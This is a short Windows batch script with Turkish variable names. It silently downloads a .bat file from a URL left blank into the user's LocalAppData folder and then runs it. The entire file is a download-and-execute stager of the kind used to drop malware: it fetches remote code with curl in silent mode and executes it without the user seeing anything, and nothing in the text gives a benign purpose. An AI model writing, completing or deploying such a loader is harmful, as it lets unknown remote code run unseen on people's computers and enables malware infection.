@echo off
setlocal

:: URL OF FILE
set "dosyaURL="

:: FILE LOCATION FOR DOWNLOAD
set "indirmeKonumu=%LOCALAPPDATA%\indirilecekdosya.bat"

:: DOWNLOAD FILE WITH USING CURL ON SILENT MODE
curl --silent -o "%indirmeKonumu%" "%dosyaURL%"

:: EXECUTE THE FILE
if exist "%indirmeKonumu%" (
    call "%indirmeKonumu%"
) else (
    echo Downloading file got an error.
)

endlocal
